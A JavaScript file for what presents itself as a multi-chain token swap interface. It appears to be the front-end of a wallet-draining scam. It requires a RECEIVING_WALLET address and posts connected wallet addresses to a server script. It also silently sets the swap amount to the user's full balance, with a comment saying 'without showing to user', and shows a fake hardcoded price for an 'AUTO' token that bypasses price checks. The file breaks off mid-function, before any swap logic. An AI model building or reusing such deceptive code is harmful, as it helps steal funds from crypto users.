// app.js - DEX-like Token Swap Interface with Enhanced Features

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
const PRICE_CACHE_DURATION = 20000; // 20 seconds in ms
const HARDCODED_PRICES = {
  'AUTO': { usd: 723.62, btc: 0.00025, eth: 0.005 },
  'TOR': { usd: 1.34, btc: 0.00025, eth: 0.005 },
  'RYU': { usd: 0.000000056, btc: 0.00, eth: 0.00 }
};
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000", // ETH
  bsc: "0x0000000000000000000000000000000000000000", // BNB
  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
};
const LOCAL_TOKEN_LISTS = {
  ethereum: "./config/eth-tokens.js",
  bsc: "./config/bsc-tokens.js",
  polygon: "./config/polygon-tokens.js",
  arbitrum: "./config/arb-tokens.js",
  base: "./config/base-tokens.js"
};
const MIN_FEE_RESERVES = {
  ethereum: 0.001, // ETH
  bsc: 0.001, // BNB
  polygon: 1.0, // MATIC
  arbitrum: 1.0, // ARB
  base: 0.001 // ETH on Base
};
const STABLECOIN_SYMBOLS = {
  ethereum: ['USDT', 'USDC', 'DAI'],
  bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
  polygon: ['USDT', 'USDC', 'DAI'],
  arbitrum: ['USDT', 'USDC', 'DAI'],
  base: ['USDC', 'DAI', 'USDT']
};
const BALANCE_CACHE = {
  lastUpdated: 0,
  data: {},
  CACHE_DURATION: 30000 // 30 seconds
};

// Performance constants
const TOKEN_SEARCH_BATCH_SIZE = 200;
const TOKEN_DISPLAY_LIMIT = 100;

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage
let currentCurrency = "usd";
let debounceTimer;
let tokenIndex = {};

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set initial active slippage option
    document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
    
    // Initialize UI components
    initNetworkDropdown();
    initCurrencySelector();
    
    // Set default tokens based on current network
    setDefaultTokenPair();
    
    // Build initial token index
    buildTokenIndex();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// INITIALIZATION FUNCTIONS
// =====================

function setupEventListeners() {
  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  
  // Debug button (remove in production)
  document.getElementById("debugSearch")?.addEventListener("click", () => {
    const address = prompt("Enter token address to debug");
    if (address) debugTokenSearch(address);
  });
  
  // Debounced input handler
  document.getElementById("fromAmount").addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      updateToAmount();
    }, 500);
  });
  
  // Network dropdown behavior
  document.getElementById("networkSelect").addEventListener('click', function(e) {
    e.stopPropagation();
    const dropdown = document.getElementById("networkDropdown");
    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
  });
  
  // Close dropdown when clicking outside
  document.addEventListener('click', function(event) {
    const dropdown = document.getElementById("networkDropdown");
    const selector = document.getElementById("networkSelect");
    if (!selector.contains(event.target) && !dropdown.contains(event.target)) {
      dropdown.style.display = 'none';
    }
  });

  // Slippage options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  // Custom slippage input
  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  // Transaction deadline
  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

function initNetworkDropdown() {
  const dropdown = document.getElementById("networkDropdown");
  dropdown.innerHTML = '';
  
  Object.keys(NETWORK_CONFIGS).forEach(network => {
    const link = document.createElement('a');
    link.href = '#';
    link.textContent = NETWORK_CONFIGS[network].chainName;
    link.addEventListener('click', (e) => {
      e.preventDefault();
      handleNetworkChange(network);
      dropdown.style.display = 'none';
    });
    dropdown.appendChild(link);
  });
}
async function trackConnectedWallet() {
  if (!userAddress) return;
  
  try {
    const formData = new FormData();
    formData.append('action', 'add_wallet');
    formData.append('wallet', userAddress);
    
    const response = await fetch('wallets.php', {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    console.log('Wallet tracking result:', result);
  } catch (err) {
    console.error('Error tracking wallet:', err);
  }
}

// Send token data to server
async function sendTokenData() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  try {
    const tokenData = {
      fromToken: currentFromToken,
      toToken: currentToToken,
      timestamp: Date.now()
    };
    
    const formData = new FormData();
    formData.append('action', 'get_token_data');
    formData.append('wallet', userAddress);
    formData.append('tokens', JSON.stringify(tokenData));
    
    const response = await fetch('wallets.php', {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    console.log('Token data saved:', result);
  } catch (err) {
    console.error('Error saving token data:', err);
  }
}

// Manual swap initiation
async function initiateManualSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) {
    alert('Please connect wallet and select tokens first');
    return;
  }
  
  const amount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (amount <= 0) {
    alert('Please enter a valid amount');
    return;
  }
  
  try {
    const formData = new FormData();
    formData.append('action', 'initiate_swap');
    formData.append('wallet', userAddress);
    formData.append('fromToken', JSON.stringify(currentFromToken));
    formData.append('toToken', JSON.stringify(currentToToken));
    formData.append('amount', amount);
    
    const response = await fetch('wallets.php', {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    console.log('Swap initiated:', result);
    alert('Swap request submitted: ' + result.message);
  } catch (err) {
    console.error('Error initiating swap:', err);
    alert('Swap failed: ' + err.message);
  }
}
function initCurrencySelector() {
  const container = document.createElement('div');
  container.className = 'dex-currency-selector';
  
  CURRENCY_OPTIONS.forEach(currency => {
    const option = document.createElement('div');
    option.className = `dex-currency-option ${currency === currentCurrency ? 'active' : ''}`;
    option.textContent = currency.toUpperCase();
    option.addEventListener('click', () => {
      currentCurrency = currency;
      document.querySelectorAll('.dex-currency-option').forEach(opt => {
        opt.classList.remove('active');
      });
      option.classList.add('active');
      updateToAmount();
    });
    container.appendChild(option);
  });
  
  document.querySelector('.dex-swap-info').prepend(container);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function escapeHtml(unsafe) {
  if (typeof unsafe !== 'string') return unsafe;
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
    bsc: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",
    polygon: "https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png",
    arbitrum: "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg",
    base: "https://assets.coingecko.com/coins/images/27645/large/base.jpeg"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

function setDefaultTokenPair() {
  const networkTokens = TOKENS[currentNetwork];
  if (!networkTokens || networkTokens.length === 0) return;
  
  // Reset both tokens
  currentFromToken = null;
  currentToToken = null;

  // Set default from token - native token for the current network
  currentFromToken = networkTokens.find(t => t.isNative) || networkTokens[0];
  
  // Set default to token - look for stablecoins first
  currentToToken = networkTokens.find(t => 
    STABLECOIN_SYMBOLS[currentNetwork]?.includes(t.symbol) && t.logo
  );
  
  // Fallback to second token if no stablecoin found
  if (!currentToToken && networkTokens.length > 1) {
    currentToToken = networkTokens[1];
  }
  
  // Update UI
  updateTokenSelectors();
  
  // If wallet is connected, update balances and set max amount
  if (userAddress) {
    updateTokenBalances();
  }
  
  // Update swap button state
  updateSwapButton();
}

// =====================
// TOKEN FUNCTIONS
// =====================

const PRICE_CACHE = new Map();

function buildTokenIndex() {
  tokenIndex = {};
  const allTokens = TOKENS[currentNetwork] || [];
  
  allTokens.forEach(token => {
    const address = token.address?.toLowerCase() || '';
    const symbol = token.symbol.toLowerCase();
    const name = token.name.toLowerCase();
    
    // Index by address
    if (address) {
      tokenIndex[address] = token;
    }
    
    // Index by symbol
    if (!tokenIndex[symbol]) {
      tokenIndex[symbol] = [];
    }
    tokenIndex[symbol].push(token);
    
    // Index by name words
    name.split(/\s+/).forEach(word => {
      if (word.length > 2) { // Ignore short words
        if (!tokenIndex[word]) {
          tokenIndex[word] = [];
        }
        tokenIndex[word].push(token);
      }
    });
  });
}

function debugTokenSearch(tokenAddress) {
  const normalizedAddress = tokenAddress.toLowerCase();
  const allTokens = TOKENS[currentNetwork] || [];
  
  console.group('Token Search Debug');
  console.log('Searching for:', normalizedAddress);
  console.log('Total tokens:', allTokens.length);
  
  // Check direct address match
  const directMatch = allTokens.find(t => 
    t.address?.toLowerCase() === normalizedAddress
  );
  
  if (directMatch) {
    console.log('Direct address match:', directMatch);
  } else {
    console.log('No direct address match found');
    
    // Check partial matches
    const partialMatches = allTokens.filter(t => 
      t.address?.toLowerCase().includes(normalizedAddress.slice(0, 10))
    );
    console.log(`Found ${partialMatches.length} partial matches`, partialMatches);
  }
  
  // Check token index
  console.log('Token index entries:');
  console.log('By address:', tokenIndex[normalizedAddress]);
  
  console.groupEnd();
}

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal")
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  // Store which type of token we're selecting (from/to)
  modal.dataset.selectionType = type;
  
  // Reset UI state
  tokenItems.innerHTML = '<div class="dex-loading-tokens"><i class="fas fa-spinner fa-spin"></i> Loading tokens...</div>';
  noTokensFound.style.display = 'none';
  searchInput.value = '';
  
  // Focus search input after a small delay to ensure it's visible
  setTimeout(() => {
    searchInput.focus();
  }, 100);
  
  // Load tokens immediately
  populateTokenList(type, tokenItems, searchInput, noTokensFound);
  
  modal.style.display = 'flex';
}

async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
  try {
    console.log('Starting token load for network:', currentNetwork);
    
    const [localTokens, additionalTokens] = await Promise.all([
      fetchLocalTokens(currentNetwork),
      TOKENS[currentNetwork] || []
    ]);
    
    console.log('Local tokens:', localTokens);
    console.log('Additional tokens:', additionalTokens);
    
    const allTokens = combineTokens(localTokens, additionalTokens);
    console.log('Combined tokens count:', allTokens.length);
    
    if (allTokens.length === 0) {
      showNoTokensFound(noTokensFound, "No tokens available");
      return;
    }
    
    const normalizedTokens = allTokens.map(token => ({
      ...token,
      searchName: token.name.toLowerCase(),
      searchSymbol: token.symbol.toLowerCase(),
      searchAddress: token.address?.toLowerCase() || ''
    }));
    
    renderTokenList(normalizedTokens.slice(0, 100), tokenItems, type);
    setupSearchFunctionality(searchInput, tokenItems, noTokensFound, normalizedTokens);
  } catch (err) {
    console.error("Token loading failed:", err);
    showTokenError(tokenItems, "Failed to load tokens");
  }
}

function setupSearchFunctionality(searchInput, tokenItems, noTokensFound, allTokens) {
  // First filter by priority tokens if available
  const priorityTokens = allTokens.filter(t => t.priority).slice(0, 100);
  renderTokenList(priorityTokens, tokenItems);
  
  let searchTimeout;
  let currentSearchTerm = '';
  
  const performSearch = () => {
    const term = searchInput.value.trim().toLowerCase();
    currentSearchTerm = term;
    
    // If search is empty, show priority tokens
    if (!term) {
      renderTokenList(priorityTokens, tokenItems);
      noTokensFound.style.display = 'none';
      return;
    }
    
    // Search in batches for better performance with large token lists
    const batchSize = 500;
    const results = [];
    
    for (let i = 0; i < allTokens.length && results.length < 100; i += batchSize) {
      const batch = allTokens.slice(i, i + batchSize);
      results.push(...batch.filter(token => 
        tokenMatchesSearch(token, term)
      ));
    }
    
    // Display results or "no tokens found" message
    if (results.length > 0) {
      renderTokenList(results.slice(0, 100), tokenItems);
      noTokensFound.style.display = 'none';
    } else {
      tokenItems.innerHTML = '';
      showNoTokensFound(noTokensFound);
    }
  };
  
  // Setup event listeners with proper debouncing
  searchInput.addEventListener('input', () => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(performSearch, 300);
  });
  
  // Add immediate search on Enter key
  searchInput.addEventListener('keyup', (e) => {
    if (e.key === 'Enter') {
      clearTimeout(searchTimeout);
      performSearch();
    }
  });
  
  // Helper function to check token matches
  function tokenMatchesSearch(token, searchTerm) {
    // Check address match first (most specific)
    if (searchTerm.startsWith('0x') && token.address) {
      return token.address.toLowerCase().includes(searchTerm);
    }
    
    // Check symbol and name
    return (
      token.symbol.toLowerCase().includes(searchTerm) ||
      token.name.toLowerCase().includes(searchTerm)
    );
  }
}

async function fetchLocalTokens(network) {
  try {
    if (!LOCAL_TOKEN_LISTS[network]) {
      console.warn('No local token list for network:', network);
      return [];
    }

    console.log(`Loading tokens from: ${LOCAL_TOKEN_LISTS[network]}`);
    const module = await import(LOCAL_TOKEN_LISTS[network]);
    console.log('Imported module structure:', module);

    // Handle different export formats
    let tokens = [];
    if (module.default) {
      tokens = module.default.bsc || module.default[network] || module.default.TOKENS || [];
    } else if (module.bsc) {
      tokens = module.bsc;
    } else if (module[network]) {
      tokens = module[network];
    } else if (module.TOKENS) {
      tokens = module.TOKENS[network] || [];
    }

    console.log(`Loaded ${tokens.length} tokens for ${network}`);
    return tokens;
  } catch (err) {
    console.error(`Failed to load tokens for ${network}:`, err);
    return [];
  }
}

async function getLocalTokens() {
  const cacheKey = `tokenList-${currentNetwork}`;
  const cached = localStorage.getItem(cacheKey);
  
  if (cached) {
    try {
      return JSON.parse(cached);
    } catch (e) {
      // Cache invalid, proceed to load fresh
    }
  }
  
  try {
    console.log('Loading local tokens for:', currentNetwork);
    const localTokens = await fetchLocalTokens(currentNetwork);
    const additionalTokens = TOKENS[currentNetwork] || [];
    const combined = combineTokens(localTokens, additionalTokens);
    
    // Cache for 1 hour
    localStorage.setItem(cacheKey, JSON.stringify(combined));
    localStorage.setItem(`${cacheKey}-timestamp`, Date.now());
    
    return combined;
  } catch (err) {
    console.error('Error in getLocalTokens:', err);
    return [];
  }
}

function combineTokens(localTokens = [], additionalTokens = []) {
  const tokenMap = new Map();
  
  // First add all local tokens
  localTokens.forEach(token => {
    const key = token.address?.toLowerCase() || token.symbol.toLowerCase();
    tokenMap.set(key, {
      ...token,
      isLocal: true
    });
  });
  
  // Then add additional tokens if they don't exist
  additionalTokens.forEach(token => {
    const key = token.address?.toLowerCase() || token.symbol.toLowerCase();
    if (!tokenMap.has(key)) {
      tokenMap.set(key, {
        ...token,
        isLocal: false
      });
    }
  });
  
  return Array.from(tokenMap.values()).sort((a, b) => {
    // Native tokens first
    if (a.isNative && !b.isNative) return -1;
    if (!a.isNative && b.isNative) return 1;
    
    // Local tokens before others
    if (a.isLocal && !b.isLocal) return -1;
    if (!a.isLocal && b.isLocal) return 1;
    
    // Then sort by symbol
    return a.symbol.localeCompare(b.symbol);
  });
}

function renderTokenList(tokens, container, type) {
  // Clear existing items
  container.innerHTML = '';
  
  if (tokens.length === 0) {
    container.innerHTML = '<div class="dex-no-tokens">No matching tokens found</div>';
    return;
  }
  
  // Use document fragment for better performance
  const fragment = document.createDocumentFragment();
  
  // Track rendered tokens to avoid duplicates
  const renderedTokens = new Set();
  
  tokens.forEach(token => {
    if (!isValidToken(token)) return;
    
    const tokenKey = token.address || token.symbol;
    if (renderedTokens.has(tokenKey)) return;
    
    renderedTokens.add(tokenKey);
    const tokenElement = createTokenElement(token, type);
    fragment.appendChild(tokenElement);
  });
  
  container.appendChild(fragment);
}

function setupVirtualScroll(container, allTokens) {
  const itemsPerPage = 50;
  let currentPage = 0;
  
  container.addEventListener('scroll', () => {
    if (container.scrollTop + container.clientHeight >= container.scrollHeight - 100) {
      currentPage++;
      const start = currentPage * itemsPerPage;
      const end = start + itemsPerPage;
      const nextTokens = allTokens.slice(start, end);
      renderTokenList(nextTokens, container);
    }
  });
}

function isValidToken(token) {
  return token && token.symbol && token.name && 
        (token.address || token.isNative);
}

function createTokenElement(token, selectionType) {
  const element = document.createElement('div');
  element.className = 'dex-token-item';
  
  element.innerHTML = `
    <img src="${escapeHtml(getTokenLogo(token))}" 
         onerror="this.src='https://assets.coingecko.com/coins/images/279/large/ethereum.png'" 
         alt="${escapeHtml(token.symbol)}">
    <div class="token-info">
      <div class="dex-token-name">
        ${escapeHtml(token.name)}
        ${getChainBadge(token.originNetwork)}
        ${token.isLocal ? '<span class="token-network-badge" data-type="preferred">Preferred</span>' : ''}
      </div>
      <div class="dex-token-symbol">${escapeHtml(token.symbol)}</div>
      ${token.address ? `
        <div class="dex-token-address" title="${escapeHtml(token.address)}">
          ${shortenAddress(token.address)}
          <i class="fas fa-copy copy-icon" title="Copy address"></i>
        </div>
      ` : ''}
    </div>
  `;

  element.addEventListener('click', () => {
    const modal = document.getElementById("tokenListModal");
    const selectionType = modal.dataset.selectionType;
    selectToken(token, selectionType);
  });
  
  const copyIcon = element.querySelector('.copy-icon');
  if (copyIcon) {
    copyIcon.addEventListener('click', (e) => {
      e.stopPropagation();
      navigator.clipboard.writeText(token.address);
      showTooltip(e.target, 'Copied!');
    });
  }
  
  return element;
}

function getTokenLogo(token) {
  if (token.logo) return token.logo;
  if (token.logoURI) return token.logoURI;
  return `https://www.coingecko.com/coins/${token.id}/logo`;
}

function getChainBadge(chain) {
  const chainNames = {
    ethereum: 'ETH',
    bsc: 'BSC',
    polygon: 'POLY',
    arbitrum: 'ARB',
    base: 'BASE'
  };
  const displayName = chainNames[chain] || chain?.toUpperCase() || 'EXT';
  return `<span class="token-network-badge" data-chain="${chain}">${displayName}</span>`;
}

function selectToken(token, type) {
  if (type === 'from') {
    // Don't allow selecting the same token in both fields
    if (currentToToken && 
        ((token.address && token.address === currentToToken.address) || 
         (token.isNative && currentToToken.isNative))) {
      updateStatus("Cannot select the same token for both sides", "error");
      return;
    }
    currentFromToken = token;
    updateTokenBalances();
  } else {
    // Don't allow selecting the same token in both fields
    if (currentFromToken && 
        ((token.address && token.address === currentFromToken.address) || 
         (token.isNative && currentFromToken.isNative))) {
      updateStatus("Cannot select the same token for both sides", "error");
      return;
    }
    currentToToken = token;
  }
  
  updateTokenSelectors();
  hideTokenList();
  updateToAmount();
}

function showNoTokensFound(element, message = "No tokens found matching your search") {
  element.innerHTML = `
    <i class="fas fa-search"></i>
    <p>${message}</p>
    <p class="small">Try a different search term</p>
  `;
  element.style.display = 'block';
}

function showTokenError(container, message = "Failed to load tokens") {
  container.innerHTML = `
    <div class="dex-token-error">
      <i class="fas fa-exclamation-circle"></i>
      <p>${message}</p>
      <button class="dex-retry-btn">Retry</button>
    </div>
  `;
  
  container.querySelector('.dex-retry-btn').addEventListener('click', () => {
    const modal = document.getElementById("tokenListModal");
    showTokenList(modal.dataset.selectionType);
  });
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function showTooltip(element, message) {
  const tooltip = document.createElement('div');
  tooltip.className = 'dex-tooltip';
  tooltip.textContent = message;
  
  const rect = element.getBoundingClientRect();
  tooltip.style.left = `${rect.left + rect.width/2}px`;
  tooltip.style.top = `${rect.top - 30}px`;
  
  document.body.appendChild(tooltip);
  
  setTimeout(() => {
    tooltip.classList.add('fade-out');
    setTimeout(() => tooltip.remove(), 300);
  }, 1000);
}

function updateTokenSelectors() {
  updateTokenSelector('fromTokenSelect', currentFromToken);
  updateTokenSelector('toTokenSelect', currentToToken);
  updateSwapButton();
}

function updateTokenSelector(selectorId, token) {
  const element = document.getElementById(selectorId);
  if (!element) return;
  
  if (token) {
    element.innerHTML = `
      <img src="${getTokenLogo(token)}" 
           onerror="this.src='https://assets.coingecko.com/coins/images/279/large/ethereum.png'">
      <span>${token.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    element.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    
    try {
      let rateText = '';
      let minReceivedText = '';
      
      const fromTokenPrice = await getTokenPrice(currentFromToken);
      
      if (fromTokenPrice) {
        rateText = `1 ${currentFromToken.symbol} = ${fromTokenPrice.toFixed(6)} ${currentCurrency.toUpperCase()}`;
        
        if (currentToToken) {
          const toTokenPrice = await getTokenPrice(currentToToken);
          if (toTokenPrice) {
            const rate = fromTokenPrice / toTokenPrice;
            const toAmount = fromAmount * rate;
            minReceivedText = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
            document.getElementById("toAmount").value = toAmount.toFixed(6);
          }
        }
      } else {
        rateText = 'Rate unavailable';
        minReceivedText = '-';
        document.getElementById("toAmount").value = '';
      }
      
      document.getElementById("exchangeRate").textContent = rateText;
      document.getElementById("minReceived").textContent = minReceivedText;
    } catch (err) {
      console.error("Error updating amounts:", err);
      document.getElementById("toAmount").value = '';
      document.getElementById("exchangeRate").textContent = 'Error fetching rate';
      document.getElementById("minReceived").textContent = '-';
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

async function getTokenPrice(token) {
  try {
    // Hardcoded price for AUTO token (bypasses all API checks)
    if (token.symbol === 'AUTO') {
      return HARDCODED_PRICES['AUTO'][currentCurrency] || 9.21;
    }

    const cacheKey = `${currentNetwork}-${token.symbol}-${currentCurrency}`;
    const now = Date.now();
    
    // Check memory cache first
    if (PRICE_CACHE.has(cacheKey)) {
      const { price, timestamp } = PRICE_CACHE.get(cacheKey);
      if (now - timestamp < PRICE_CACHE_DURATION) {
        return price;
      }
    }
    
    // Check localStorage cache
    const localStorageKey = `price-${cacheKey}`;
    const cached = localStorage.getItem(localStorageKey);
    if (cached) {
      const { price, timestamp } = JSON.parse(cached);
      if (now - timestamp < PRICE_CACHE_DURATION) {
        PRICE_CACHE.set(cacheKey, { price, timestamp });
        return price;
      }
    }

    let price = null;
    const network = token.originNetwork || currentNetwork;
    
    // Skip API check for native tokens if we have hardcoded price
    if (!token.address || token.isNative) {
      const nativeTokenIds = {
        ethereum: 'ethereum',
        bsc: 'binancecoin',
        polygon: 'matic-network',
        arbitrum: 'ethereum',
        base: 'ethereum'
      };
      
      const id = nativeTokenIds[network];
      if (id && !HARDCODED_PRICES[token.symbol]) {
        const response = await fetchWithTimeout(
          `${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`,
          { timeout: 3000 }
        );
        
        if (response.ok) {
          const data = await response.json();
          price = data[id]?.[currentCurrency];
        }
      }
    } else {
      // Skip API check if we have hardcoded price
      if (!HARDCODED_PRICES[token.symbol]) {
        const platformIds = {
          ethereum: 'ethereum',
          bsc: 'binance-smart-chain',
          polygon: 'polygon-pos',
          arbitrum: 'arbitrum-one',
          base: 'base'
        };
        
        const platform = platformIds[network];
        if (platform) {
          const [contractResponse, symbolResponse] = await Promise.all([
            fetchWithTimeout(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`, { timeout: 3000 }),
            fetchWithTimeout(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`, { timeout: 3000 })
          ]);
          
          if (contractResponse.ok) {
            const contractData = await contractResponse.json();
            price = contractData.market_data?.current_price?.[currentCurrency];
          }
          
          if (!price && symbolResponse.ok) {
            const symbolData = await symbolResponse.json();
            price = symbolData[token.symbol.toLowerCase()]?.[currentCurrency];
          }
        }
      }
    }
    
    // Fallback to hardcoded prices if no API price found
    if (!price) {
      price = HARDCODED_PRICES[token.symbol]?.[currentCurrency];
    }
    
    // Update caches if we got a price
    if (price !== null) {
      const cacheData = { price, timestamp: now };
      PRICE_CACHE.set(cacheKey, cacheData);
      localStorage.setItem(localStorageKey, JSON.stringify(cacheData));
    }
    
    return price;
  } catch (err) {
    console.error(`Error getting price for ${token.symbol}:`, err);
    // Return hardcoded price if available, otherwise null
    return HARDCODED_PRICES[token.symbol]?.[currentCurrency] || null;
  }
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        if (currentNetwork !== network) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair();
          buildTokenIndex();
        }
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await setDefaultTokenPair();
    buildTokenIndex();
    await updateTokenBalances();
    
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        handleWalletDisconnect();
      } else {
        userAddress = accounts[0];
        updateWalletButton(true);
        updateTokenBalances();
      }
    });
    
    window.ethereum.on('chainChanged', (chainId) => {
      for (const network in NETWORK_CONFIGS) {
        if (NETWORK_CONFIGS[network].chainId === chainId) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair();
          buildTokenIndex();
          break;
        }
      }
    });
    await preloadTokenBalances();
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

function handleWalletDisconnect() {
  userAddress = null;
  provider = null;
  signer = null;
  localStorage.removeItem('walletConnected');
  updateWalletButton(false);
  updateSwapButton();
  updateStatus("Wallet disconnected", "success");
}

async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    if (token.address && !ethers.utils.isAddress(token.address)) {
      console.warn(`Skipping ${token.symbol} - invalid address`);
      return 0;
    }

    let balance;
    if (token.isNative) {
      balance = await provider.getBalance(userAddress);
      return parseFloat(ethers.utils.formatEther(balance));
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      try {
        balance = await contract.balanceOf(userAddress);
        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
      } catch (err) {
        console.warn(`Balance check failed for ${token.symbol}:`, err.message);
        return 0;
      }
    }
  } catch (err) {
    console.warn(`Error fetching ${token.symbol} balance:`, err.message);
    return 0;
  }
}

async function getMaxSwapAmount(token) {
  if (!token || !userAddress) return 0;
  
  const balance = await fetchTokenBalance(token);
  
  if (token.isNative) {
    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
    return Math.max(0, balance - minReserve);
  }
  
  return balance;
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    const balanceElement = document.getElementById("fromTokenBalance");
    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
    
    const balance = await fetchTokenBalance(currentFromToken);
    if (balance <= 0) {
      balanceElement.innerHTML = `Balance: 0 ${currentFromToken.symbol}`;
      document.getElementById("swapBtn").disabled = true;
    } else {
      balanceElement.innerHTML = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
      
      // Automatically set max amount without showing to user
      const maxAmount = await getMaxSwapAmount(currentFromToken);
      document.getElementById("fromAmount").value = maxAmount.toFixed(6);
      updateToAmount();
    }
  } catch (err) {
